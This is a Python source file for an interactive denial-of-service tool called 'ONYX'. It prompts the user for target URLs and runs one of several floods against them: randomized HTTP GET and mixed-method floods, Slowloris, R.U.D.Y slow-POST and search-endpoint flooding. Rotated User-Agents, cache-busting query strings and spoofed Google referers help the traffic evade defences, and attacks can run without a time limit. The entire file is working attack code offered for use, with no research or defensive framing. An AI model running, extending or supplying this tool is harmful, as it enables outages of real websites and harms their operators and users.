import requests
import threading
import random
import time
import os
import asyncio
import aiohttp
import socket
from rich.console import Console
from rich.style import Style
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import locale
import ssl

locale.setlocale(locale.LC_ALL, '')

console = Console()
timeout_duration = 20

# --- Colors ---
color_pink = Style(color="pink1")
color_orange = Style(color="orange1")
color_title = Style(color="deep_sky_blue1", bold=True)

# --- Global variables ---
success_requests = 0
failed_requests = 0
total_requests = 0
stop_attack_flag = False
elapsed_time = 0
progress = {}
lock = threading.Lock()
used_headers = {"slowloris": {}, "rudy": {}}
header_source = {}

def display_title():
    console.print("[bold deep_sky_blue1]ONYX - DoS Attack Tool[/]\n", style=color_pink)

def read_url_list(file_name):
    try:
        url_list = []
        with open(file_name, 'r') as f:
            for line in f:
                url = line.strip()
                if not urlparse(url).scheme or not urlparse(url).netloc:
                    log_message(f"[red]Invalid URL: {url}[/]")
                    continue
                url_list.append(url)
        return url_list
    except FileNotFoundError:
        console.print(f"Error: File '{file_name}' not found.", style="bold red")
        return []

def read_user_agents(file_name="user_agents.txt"):
    try:
        with open(file_name, 'r') as f:
            user_agents = f.read().splitlines()
        return user_agents
    except FileNotFoundError:
        console.print(f"Error: File '{file_name}' not found. Using default User-Agent.", style="yellow")
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        ]
user_agent_list = []

def get_random_user_agent():
    if not user_agent_list:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    return random.choice(user_agent_list)

def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1,
                    status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries, pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def create_status_table(targets, thread_count, elapsed_time, attack_duration, progress, success_requests, failed_requests, total_requests):
    # Compact table for portrait mode
    table = Table(title="[dark_orange]Attack Status[/]", style="light_steel_blue1", box=None, padding=(0, 1))
    table.add_column("Item", style="cyan", width=12)
    table.add_column("Value", style="magenta", width=10)
    table.add_row("Threads", str(thread_count), style="dark_orange")
    table.add_row("Total", str(total_requests), style=color_pink)
    table.add_row("OK", str(success_requests), style="chartreuse1")
    table.add_row("Fail", str(failed_requests), style="orange_red1")
    table.add_row("Time", f"{int(elapsed_time)}/{attack_duration}s", style="pink1")
    table.add_row()
    table.add_row("[grey100]Progress[/]", style="pink1")

    for url, info in progress.items():
        # Shorten URL if too long
        short_url = url[:30] + '..' if len(url) > 30 else url
        table.add_row(f"[i]{short_url}[/]", f"{info['completed']}/{info['total']} ({info['percentage']:.1f}%)", style="pink1")

    return table

def update_progress(targets, attack_duration):
    global elapsed_time

    for url in targets:
        progress[url] = {
            "completed": 0,
            "total": attack_duration * thread_count if attack_duration > 0 else float('inf'),
            "percentage": 0,
            "speed": 0,
            "start_time": time.time()
        }

    while not stop_attack_flag:
        for url in targets:
            if attack_duration > 0:
                progress[url]["percentage"] = min(100, (progress[url]["completed"] / progress[url]["total"]) * 100)
            else:
                progress[url]["percentage"] = 0
            progress[url]["speed"] = progress[url]["completed"] / (time.time() - progress[url]["start_time"] + 1e-9)
            if elapsed_time >= attack_duration and attack_duration > 0:
                progress[url]["percentage"] = 100
        yield progress

def display_status(targets, thread_count, attack_duration):
    global elapsed_time, success_requests, failed_requests, total_requests
    start_time = time.time()

    with Live(console=console, refresh_per_second=10) as live:
        for _ in update_progress(targets, attack_duration):
            elapsed_time = time.time() - start_time
            if attack_duration > 0 and elapsed_time >= attack_duration:
                stop_attack()
                break

            status_table = create_status_table(
                targets, thread_count, elapsed_time, attack_duration, progress,
                success_requests, failed_requests, total_requests
            )
            layout = Layout()
            # Portrait mode: stacked vertically (top = status, bottom = logs)
            layout.split_column(
                Layout(name="top", size=12),  # fixed height for status
                Layout(name="bottom"),
            )
            layout["top"].update(status_table)
            if hasattr(display_status, "logs_panel"):
                layout["bottom"].update(display_status.logs_panel)
            live.update(layout)
            time.sleep(refresh_rate)

def log_message(message, user_agent=None):
    if not hasattr(display_status, "logs"):
        display_status.logs = []

    log_entry = f"{message} - UA: {user_agent}" if user_agent else message
    display_status.logs.append(log_entry)
    if len(display_status.logs) > 5:  # keep fewer logs for portrait
        display_status.logs.pop(0)

    log_table = Table(title="[dark_orange]Activity[/]", show_header=False, style="light_steel_blue1", box=None, padding=(0, 1))
    log_table.add_column("Log")
    for log in reversed(display_status.logs):
        log_table.add_row(log[:60] + '..' if len(log) > 60 else log)
    display_status.logs_panel = Panel(log_table, border_style="light_steel_blue1", height=5)

    if save_log:
        try:
            with open("attack_log.txt", "a", encoding="utf-8") as f:
                f.write(log_entry + "\n")
        except:
            pass

def get_auto_headers(url, method):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    if method == "slowloris":
        headers['X-a'] = str(random.randint(1, 5000))
        if urlparse(url).scheme == 'https':
            headers['HTTPS'] = '1'
    elif method == "rudy":
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['X-RUDY'] = '1'
    used_headers[method][url] = headers
    return headers

def create_diverse_headers(url, custom_headers=None):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Referer': f'https://www.google.com/search?q={random.choice(search_keywords)}' if search_keywords and search_url_bases else 'https://www.google.com/'
    }
    if custom_headers:
        headers.update(custom_headers)
    return headers

async def attack_url_get(session, url, headers, sem):
    global success_requests, failed_requests, total_requests, elapsed_time
    async with sem:
        while not stop_attack_flag:
            headers['User-Agent'] = get_random_user_agent()
            url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
            try:
                async with session.get(url_with_params, headers=headers, timeout=timeout_duration) as response:
                    with lock:
                        if response.status == 200:
                            success_requests += 1
                            log_message(f"[green]GET OK: {url_with_params}[/]", headers['User-Agent'])
                        else:
                            failed_requests += 1
                            log_message(f"[red]GET fail: {url_with_params} - {response.status}[/]", headers['User-Agent'])
                        total_requests += 1
                        progress[url]['completed'] += 1
            except asyncio.TimeoutError:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]GET timeout: {url_with_params}[/]", headers['User-Agent'])
                    total_requests += 1
                    progress[url]['completed'] += 1
            except aiohttp.ClientError as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Conn error: {url_with_params} - {e}[/]", headers['User-Agent'])
                    total_requests += 1
                    progress[url]['completed'] += 1
            except Exception as e:
                with lock:
                    console.print(f"Error: {e}", style='bold red')
                    failed_requests += 1
                    total_requests += 1
                    progress[url]['completed'] += 1

async def attack_url_mixed(session, url, headers, method, sem):
    global success_requests, failed_requests, total_requests
    async with sem:
        while not stop_attack_flag:
            headers['User-Agent'] = get_random_user_agent()
            try:
                if method == 'GET':
                    url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
                    async with session.get(url_with_params, headers=headers, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]{method} OK: {url_with_params}[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]{method} fail: {url_with_params} - {response.status}[/]", headers['User-Agent'])
                elif method in ('POST', 'PUT'):
                    data_size = random.randint(100, 1000)
                    data = os.urandom(data_size)
                    async with getattr(session, method.lower())(url, headers=headers, data=data, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]{method} OK: {url} ({data_size}B)[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]{method} fail: {url} - {response.status}[/]", headers['User-Agent'])
                elif method == 'DELETE':
                    async with session.delete(url, headers=headers, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]DELETE OK: {url}[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]DELETE fail: {url} - {response.status}[/]", headers['User-Agent'])
                else:
                    with lock:
                        console.print(f"Method {method} not supported.", style="yellow")
                        continue
            except asyncio.TimeoutError:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]{method} timeout: {url}[/]", headers['User-Agent'])
            except aiohttp.ClientError as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Conn error: {url} - {e}[/]", headers['User-Agent'])
            except Exception as e:
                with lock:
                    log_message(f"[red]Unexpected: {e}[/]", headers['User-Agent'])
                    console.print(f"Unexpected: {e}", style="bold red")
            finally:
                with lock:
                    total_requests += 1
                    progress[url]['completed'] += 1

async def attack_url_search(session, url_base, headers, keywords, sem):
    global success_requests, failed_requests, total_requests
    async with sem:
        while not stop_attack_flag:
            headers['User-Agent'] = get_random_user_agent()
            try:
                chosen = " ".join(random.sample(keywords, random.randint(1, min(3, len(keywords))))) if keywords else ""
                search_url = f"{url_base}{chosen}"
                async with session.get(search_url, headers=headers, timeout=timeout_duration) as response:
                    with lock:
                        if response.status == 200:
                            success_requests += 1
                            log_message(f"[green]Search OK: {chosen}[/]", headers['User-Agent'])
                        else:
                            failed_requests += 1
                            log_message(f"[red]Search fail: {chosen} - {response.status}[/]", headers['User-Agent'])
            except asyncio.TimeoutError:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Search timeout: {search_url}[/]", headers['User-Agent'])
            except aiohttp.ClientError as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Search conn err: {e}[/]", headers['User-Agent'])
            except Exception as e:
                with lock:
                    log_message(f"[red]Search error: {e}[/]", headers['User-Agent'])
                    console.print(f"Search error: {e}", style="bold red")
            finally:
                with lock:
                    total_requests += 1

async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
    global success_requests, failed_requests, total_requests
    async with sem:
        while not stop_attack_flag:
            sockets = []
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    if port == 443:
                        context = ssl.create_default_context()
                        s = context.wrap_socket(s, server_hostname=urlparse(url).hostname)
                        protocol = "HTTPS"
                    else:
                        protocol = "HTTP"
                    s.connect((urlparse(url).hostname, port))
                    sockets.append(s)
                    headers['User-Agent'] = get_random_user_agent()
                    request = f"GET {url} {protocol}/1.1\r\n"
                    for k, v in headers.items():
                        request += f"{k}: {v}\r\n"
                    request += "\r\n"
                    s.send(request.encode())
                    log_message(f"[yellow]Slowloris header sent to {url}:{port}[/]", headers['User-Agent'])
                except Exception as e:
                    with lock:
                        failed_requests += 1
                        log_message(f"[red]Slowloris err {url}:{port} - {e}[/]", headers['User-Agent'])
            while not stop_attack_flag:
                for s in sockets:
                    port = s.getpeername()[1] if s else "N/A"
                    try:
                        s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    except:
                        with lock:
                            sockets.remove(s)
                            failed_requests += 1
                            log_message(f"[red]Slowloris lost {url}:{port}[/]", headers['User-Agent'])
                for port in ports:
                    if not any(s.getpeername()[1] == port for s in sockets if s):
                        try:
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(4)
                            if port == 443:
                                context = ssl.create_default_context()
                                new_s = context.wrap_socket(new_s, server_hostname=urlparse(url).hostname)
                            new_s.connect((urlparse(url).hostname, port))
                            headers['User-Agent'] = get_random_user_agent()
                            request = f"GET {url} HTTP/1.1\r\n"
                            for k, v in headers.items():
                                request += f"{k}: {v}\r\n"
                            request += "\r\n"
                            new_s.send(request.encode())
                            log_message(f"[yellow]New Slowloris socket {url}:{port}[/]", headers['User-Agent'])
                            sockets.append(new_s)
                        except Exception as e:
                            with lock:
                                failed_requests += 1
                                log_message(f"[red]Slowloris new socket err {url}:{port} - {e}[/]", headers['User-Agent'])
                if not sockets:
                    log_message("[red]No sockets, stopping Slowloris[/]", headers['User-Agent'])
                    break
                await asyncio.sleep(15)
                for s in sockets:
                    if s:
                        s.close()
            with lock:
                total_requests += 1
                progress[url]['completed'] += 1

async def rudy_attack(session, url, headers, sem):
    global success_requests, failed_requests, total_requests
    async with sem:
        while not stop_attack_flag:
            s = None
            try:
                headers['User-Agent'] = get_random_user_agent()
                log_message(f"[yellow]RUDY connecting {url}[/]", headers['User-Agent'])
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((urlparse(url).hostname, 80))
                log_message(f"[green]RUDY connected {url}[/]", headers['User-Agent'])
                request = f"POST {url} HTTP/1.1\r\n"
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                request += f"Content-Length: {random.randint(5000,10000)}\r\n\r\n"
                s.send(request.encode())
                log_message(f"[yellow]RUDY header sent {url}[/]", headers['User-Agent'])
                while not stop_attack_flag:
                    s.send(os.urandom(1))
                    log_message(f"[yellow]RUDY 1 byte sent {url}[/]", headers['User-Agent'])
                    await asyncio.sleep(random.uniform(5, 15))
            except Exception as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]RUDY error {url} - {e}[/]", headers['User-Agent'])
            finally:
                if s:
                    s.close()
                with lock:
                    total_requests += 1
                    progress[url]['completed'] += 1

async def attack_overall(targets, thread_count, attack_method, methods, search_url_bases, search_keywords, custom_headers, ports):
    tasks = []
    sems = {url: asyncio.Semaphore(thread_count) for url in targets}
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
        for url in targets:
            sem = sems[url]
            if attack_method == 'slowloris':
                headers = get_auto_headers(url, "slowloris") if header_source.get(url,"auto")=="auto" else custom_headers
                for _ in range(thread_count):
                    tasks.append(asyncio.ensure_future(slowloris_attack(session, url, headers, sem, ports=ports)))
            elif attack_method == 'rudy':
                headers = get_auto_headers(url, "rudy") if header_source.get(url,"auto")=="auto" else custom_headers
                for _ in range(thread_count):
                    tasks.append(asyncio.ensure_future(rudy_attack(session, url, headers, sem)))
            else:
                headers = create_diverse_headers(url, custom_headers)
                if attack_method == 'get':
                    for _ in range(thread_count):
                        tasks.append(asyncio.ensure_future(attack_url_get(session, url, headers, sem)))
                elif attack_method == 'mixed':
                    for _ in range(thread_count):
                        method = random.choice(methods) if len(methods)>1 else methods[0]
                        tasks.append(asyncio.ensure_future(attack_url_mixed(session, url, headers, method, sem)))
        if search_url_bases:
            for base in search_url_bases:
                headers = create_diverse_headers(base, custom_headers)
                sem = asyncio.Semaphore(thread_count)
                for _ in range(thread_count):
                    tasks.append(asyncio.ensure_future(attack_url_search(session, base, headers, search_keywords, sem)))
        await asyncio.gather(*tasks)

def stop_attack():
    global stop_attack_flag
    stop_attack_flag = True
    console.print("\n[bold yellow]Stopping attack...[/]")
    log_message("User stopped the attack script!")
    print("=" * 55)

def display_options():
    tree = Tree("📁 [pink1]ONYX - DOS TOOL[/]")
    tree.add("├─── [red1]AVAILABLE METHODS[/]")
    methods_tree = tree.add("├─── [pink1]LAYER 7[/]")
    methods_tree.add("├─── [green]HTTP[/]")
    methods_tree.add("├─── [green]HTTPS[/]")
    methods_tree.add("├─── [green]SLOWLORIS[/]")
    methods_tree.add("└─── [green]R.U.D.Y[/]")
    config_tree = tree.add("└─── [bold]CURRENT CONFIG[/]")
    config_tree.add(f"    ├─── [bold]METHOD[/]: [deep_sky_blue1]{attack_method}[/]")
    if attack_method == 'mixed':
        config_tree.add(f"    ├─── [bold]HTTP METHODS[/]: [deep_sky_blue1]{', '.join(methods)}[/]")
    if attack_method == 'search' and search_url_bases and search_keywords:
        for base in search_url_bases:
            config_tree.add(f"    ├─── [bold]SEARCH URL BASE[/]: [deep_sky_blue1]{base}[/]")
        config_tree.add(f"    ├─── [bold]KEYWORDS[/]: [deep_sky_blue1]{', '.join(search_keywords)}[/]")
    config_tree.add(f"    ├─── [bold]TIME[/]: [deep_sky_blue1]{attack_duration}[/]")
    config_tree.add(f"    ├─── [bold]THREADS[/]: [deep_sky_blue1]{thread_count}[/]")
    if custom_headers.get('Cookie'):
        config_tree.add(f"    ├─── [bold]COOKIE[/]: [deep_sky_blue1]{custom_headers['Cookie']}[/]")
    if is_user_agent_from_file:
        config_tree.add(f"    ├─── [bold]User-Agent[/]: [deep_sky_blue1]From file ({user_agent_chosen})[/]")
    else:
        config_tree.add(f"    ├─── [bold]User-Agent[/]: [deep_sky_blue1]{user_agent_chosen}[/]")
    for url in targets:
        config_tree.add(f"    └─── [bold]URL[/]: [pink1]{url}[/]")
        if attack_method in used_headers and url in used_headers[attack_method]:
            headers_tree = config_tree.add(f"        └─── [bold]Headers used for {url}[/]")
            for h, v in used_headers[attack_method][url].items():
                headers_tree.add(f"            ├─── [yellow]{h}[/]: [green]{v}[/]")
        if attack_method in ("slowloris","rudy"):
            src = header_source.get(url, "auto")
            config_tree.add(f"        └─── [bold]Headers source[/]: [deep_sky_blue1]{src}[/]")
    console.print(tree)

def input_parameters():
    global thread_count, attack_duration, attack_method, methods, refresh_rate, targets, search_url_bases, search_keywords, save_log, custom_headers, user_agent_list, is_user_agent_from_file, user_agent_chosen, header_source
    display_title()
    ports = []

    attack_method = Prompt.ask(
        "[deep_sky_blue1 bold]Select attack mode[/]:\n[bold orange1]1.[/] Simple [bold green]GET[/] (Default)\n[bold orange1]2.[/] [bold green]CUSTOM[/]\n[bold orange1]3.[/] [bold green]SLOWLORIS[/]\n[bold orange1]4.[/] [bold green]R.U.D.Y[/]\n[bold orange1]5.[/] [bold green]SEARCH[/]",
        choices=["1","2","3","4","5"], default="1"
    )

    url_input = Prompt.ask("[deep_sky_blue1 bold]Input target[/]:\n[bold orange1]1.[/] From file\n[bold orange1]2.[/] Manual", choices=["1","2"], default="1")
    if url_input == "1":
        fname = Prompt.ask("Filename (e.g., url.txt)")
        targets = read_url_list(fname)
    else:
        manual = Prompt.ask("Target URL (e.g., https://example.com)")
        targets = [manual]

    if not targets:
        return [], 0, 0, 0, "1", [], [], None, False, {}, []

    while True:
        try:
            thread_count = int(Prompt.ask("Number of threads"))
            if thread_count > 0: break
            console.print("Must be >0.", style="bold red")
        except ValueError:
            console.print("Invalid.", style="bold red")

    while True:
        try:
            refresh_rate = float(Prompt.ask("Refresh speed (sec, e.g., 0.5)"))
            if refresh_rate > 0: break
            console.print("Must be >0.", style="bold red")
        except ValueError:
            console.print("Invalid.", style="bold red")

    while True:
        try:
            attack_duration = int(Prompt.ask("Duration (seconds, 0=unlimited)"))
            if attack_duration >= 0: break
            console.print("Cannot be negative.", style="bold red")
        except ValueError:
            console.print("Invalid.", style="bold red")

    methods = []
    search_url_bases = []
    search_keywords = None
    custom_headers = {}

    if attack_method == "2":
        attack_method = "mixed"
        method_str = Prompt.ask("HTTP methods (comma separated, e.g., GET,POST,PUT,DELETE) or ALL")
        if method_str.upper() == 'ALL':
            methods = ['GET','POST','PUT','DELETE']
        else:
            methods = [m.strip().upper() for m in method_str.split(',')]
    elif attack_method == "3":
        attack_method = "slowloris"
    elif attack_method == "4":
        attack_method = "rudy"
    elif attack_method == "5":
        attack_method = "search"
        search_input = Prompt.ask("[deep_sky_blue1 bold]Input search URL[/]:\n1. From file\n2. Manual", choices=["1","2"], default="1")
        if search_input == "1":
            sf = Prompt.ask("Search filename (e.g., search_urls.txt)")
            search_url_bases = read_url_list(sf)
        else:
            base = Prompt.ask("Base search URL (e.g., https://example.com/search?q=)")
            search_url_bases = [base]
        if not search_url_bases:
            console.print("No search URLs.", style="yellow")
            return [], 0, 0, 0, "1", [], [], None, False, {}, []
        if Confirm.ask("Add keywords?"):
            kw = Prompt.ask("Keywords separated by commas (e.g., python, web, security)")
            search_keywords = [k.strip() for k in kw.split(',')]
        else:
            search_keywords = [chr(random.randint(97,122)) for _ in range(50)]
    else:
        attack_method = "get"

    if Confirm.ask("Add cookie?"):
        cookie_val = Prompt.ask("Cookie value (e.g., 'key1=value1; key2=value2')")
        custom_headers['Cookie'] = cookie_val

    if attack_method in ("slowloris","rudy"):
        for url in targets:
            choice = Prompt.ask(f"Header source for {url}:\n1. Auto\n2. Manual", choices=["1","2"], default="1")
            header_source[url] = "auto" if choice=="1" else "custom"

    ua_choice = Prompt.ask("[deep_sky_blue1 bold]User-Agent[/]:\n1. From file (user_agents.txt)\n2. Manual", choices=["1","2"], default="1")
    if ua_choice == "1":
        uf = Prompt.ask("User-Agent filename")
        user_agent_list = read_user_agents(uf)
        if user_agent_list:
            is_user_agent_from_file = True
            user_agent_chosen = uf
        else:
            is_user_agent_from_file = False
            user_agent_chosen = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            console.print("[yellow]Using default UA.[/]")
    else:
        manual_ua = Prompt.ask("Custom User-Agent")
        is_user_agent_from_file = False
        user_agent_chosen = manual_ua

    custom_headers['User-Agent'] = user_agent_chosen if not is_user_agent_from_file else get_random_user_agent()

    if attack_method == "slowloris":
        port_choice = Prompt.ask("Ports:\n1. 80 (HTTP)\n2. 443 (HTTPS)\n3. Both", choices=["1","2","3"], default="3")
        ports = [80] if port_choice=="1" else [443] if port_choice=="2" else [80,443]

    save_log = Confirm.ask("Save log?")
    os.system('cls' if os.name == 'nt' else 'clear')
    display_title()
    console.print(Panel(f"[bold green]✓[/] Settings:\n - Method: {attack_method}\n - Targets: {targets}\n - Threads: {thread_count}\n - Refresh: {refresh_rate}s\n - Duration: {attack_duration}s\n - Save log: {save_log}", style="light_steel_blue1"))
    display_options()
    if attack_method == "slowloris":
        print(f"    └─── [bold]PORTS[/]: [deep_sky_blue1]{ports}[/]")
    return targets, thread_count, attack_duration, refresh_rate, attack_method, methods, search_url_bases, search_keywords, save_log, custom_headers, ports

async def main():
    global stop_attack_flag, success_requests, failed_requests, total_requests, refresh_rate, elapsed_time, save_log, custom_headers
    try:
        targets, thread_count, attack_duration, refresh_rate, attack_method, methods, search_url_bases, search_keywords, save_log, custom_headers, ports = input_parameters()
        if not targets:
            console.print("No targets. Exiting.", style="bold red")
            return
        console.print(Panel("[bold blue]Starting attack...[/]", style="light_steel_blue1"))
        print("=" * 55)
        status_thread = threading.Thread(target=display_status, args=(targets, thread_count, attack_duration))
        status_thread.daemon = True
        status_thread.start()
        log_message(f"Attack started: {attack_method} | {targets} | {attack_duration}s")
        await attack_overall(targets, thread_count, attack_method, methods, search_url_bases, search_keywords, custom_headers, ports)
        while not stop_attack_flag:
            await asyncio.sleep(1)
            if attack_duration > 0 and elapsed_time >= attack_duration:
                stop_attack()
                break
    except KeyboardInterrupt:
        stop_attack()
    finally:
        console.print(Panel("[bold green]All threads stopped. Script finished.[/]", style="light_steel_blue1"))
        print("=" * 55)
        if save_log:
            console.print("Log saved to [bold blue]attack_log.txt[/].")
        input("Press Enter to exit...")

if __name__ == "__main__":
    asyncio.run(main())
